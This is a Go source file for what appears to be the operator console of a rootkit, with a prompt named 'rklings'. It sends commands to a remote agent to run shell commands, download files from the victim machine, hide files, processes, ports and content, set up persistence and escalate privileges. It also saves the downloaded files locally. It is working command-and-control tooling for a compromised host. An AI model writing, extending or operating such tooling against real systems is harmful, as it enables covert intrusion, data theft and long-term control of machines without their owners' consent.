package main

import (
	"bufio"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"os"
	"path/filepath"
	"strings"
	"time"
)

func startTUI() {
	reader := bufio.NewReader(os.Stdin)
	fmt.Println("[*] Operator console ready. Type 'help' for commands.")

	for {
		fmt.Print("rklings> ")
		line, err := reader.ReadString('\n')
		if err != nil {
			return
		}
		line = strings.TrimSpace(line)
		if line == "" {
			continue
		}

		parts := strings.SplitN(line, " ", 2)
		cmd := strings.ToLower(parts[0])
		arg := ""
		if len(parts) > 1 {
			arg = parts[1]
		}

		switch cmd {
		case "help":
			fmt.Println("  ping                  Send PING to agent")
			fmt.Println("  status                Show agent status")
			fmt.Println("  shell <command>       Execute a shell command")
			fmt.Println("  download <path>       Save a remote file locally")
			fmt.Println("  hide <type> <value>   Hide file/pid/port/content")
			fmt.Println("  unhide <type> <value> Restore the same target")
			fmt.Println("  persist               Enable persistence")
			fmt.Println("  escalate [pid]        Escalate privileges")
			fmt.Println("  exit                  Quit")
		case "ping":
			start := time.Now()
			raw, err := sendCommand("PING", "", nil)
			if err != nil {
				fmt.Printf("[-] %v\n", err)
				continue
			}
			fmt.Printf("[+] %s (%dms)\n", rawToString(raw), time.Since(start).Milliseconds())
		case "status":
			raw, err := sendCommand("STATUS", "", nil)
			if err != nil {
				fmt.Printf("[-] %v\n", err)
				continue
			}
			fmt.Printf("[+] %s\n", rawToString(raw))
		case "shell":
			if arg == "" {
				fmt.Println("[-] usage: shell <command>")
				continue
			}
			raw, err := sendCommand("SHELL", arg, nil)
			if err != nil {
				fmt.Printf("[-] %v\n", err)
				continue
			}
			var result struct {
				Stdout   string `json:"stdout"`
				ExitCode int    `json:"exit_code"`
			}
			if json.Unmarshal(raw, &result) == nil {
				fmt.Print(result.Stdout)
				if result.Stdout != "" && !strings.HasSuffix(result.Stdout, "\n") {
					fmt.Println()
				}
			} else {
				fmt.Printf("[+] %s\n", rawToString(raw))
			}
		case "download":
			if arg == "" {
				fmt.Println("[-] usage: download <path>")
				continue
			}
			raw, err := sendCommand("DOWNLOAD", arg, nil)
			if err != nil {
				fmt.Printf("[-] %v\n", err)
				continue
			}
			reply := rawToString(raw)
			if strings.HasPrefix(reply, "ERR") || strings.Contains(reply, `"error"`) {
				fmt.Printf("[-] %s\n", reply)
				continue
			}
			var dl struct {
				Data string `json:"data"`
			}
			if json.Unmarshal(raw, &dl) != nil || dl.Data == "" {
				fmt.Printf("[-] unexpected response: %s\n", reply)
				continue
			}
			decoded, err := base64.StdEncoding.DecodeString(dl.Data)
			if err != nil {
				fmt.Printf("[-] decode: %v\n", err)
				continue
			}
			path, err := saveDownload(arg, decoded)
			if err != nil {
				fmt.Printf("[-] save download: %v\n", err)
				continue
			}
			fmt.Printf("[+] saved %d bytes -> %s\n", len(decoded), path)
		case "hide":
			hideParts := strings.SplitN(arg, " ", 2)
			if len(hideParts) < 2 {
				fmt.Println("[-] usage: hide <file|pid|port|content> <value>")
				continue
			}
			raw, err := sendCommand("HIDE", fmt.Sprintf("%s %s", strings.ToUpper(hideParts[0]), hideParts[1]), nil)
			if err != nil {
				fmt.Printf("[-] %v\n", err)
				continue
			}
			fmt.Printf("[+] %s\n", rawToString(raw))
		case "unhide":
			hideParts := strings.SplitN(arg, " ", 2)
			if len(hideParts) < 2 {
				fmt.Println("[-] usage: unhide <file|pid|port|content> <value>")
				continue
			}
			raw, err := sendCommand("UNHIDE", fmt.Sprintf("%s %s", strings.ToUpper(hideParts[0]), hideParts[1]), nil)
			if err != nil {
				fmt.Printf("[-] %v\n", err)
				continue
			}
			fmt.Printf("[+] %s\n", rawToString(raw))
		case "persist":
			raw, err := sendCommand("PERSIST", "", nil)
			if err != nil {
				fmt.Printf("[-] %v\n", err)
				continue
			}
			fmt.Printf("[+] %s\n", rawToString(raw))
		case "escalate":
			escCmd := "ESCALATE"
			raw, err := sendCommand(escCmd, arg, nil)
			if err != nil {
				fmt.Printf("[-] %v\n", err)
				continue
			}
			fmt.Printf("[+] %s\n", rawToString(raw))
		case "exit", "quit":
			return
		default:
			fmt.Printf("[-] unknown command: %s\n", cmd)
		}
	}
}

func saveDownload(remotePath string, payload []byte) (string, error) {
	relative := strings.TrimPrefix(filepath.Clean("/"+remotePath), string(filepath.Separator))
	if relative == "" || relative == "." {
		return "", fmt.Errorf("invalid remote path")
	}
	path := filepath.Join(".rklings", "downloads", relative)
	directory := filepath.Dir(path)
	if err := os.MkdirAll(directory, 0o700); err != nil {
		return "", err
	}
	temporary, err := os.CreateTemp(directory, ".download-*")
	if err != nil {
		return "", err
	}
	temporaryPath := temporary.Name()
	defer os.Remove(temporaryPath)
	if err := temporary.Chmod(0o600); err != nil {
		temporary.Close()
		return "", err
	}
	if _, err := temporary.Write(payload); err != nil {
		temporary.Close()
		return "", err
	}
	if err := temporary.Sync(); err != nil {
		temporary.Close()
		return "", err
	}
	if err := temporary.Close(); err != nil {
		return "", err
	}
	if err := os.Rename(temporaryPath, path); err != nil {
		return "", err
	}
	return path, nil
}
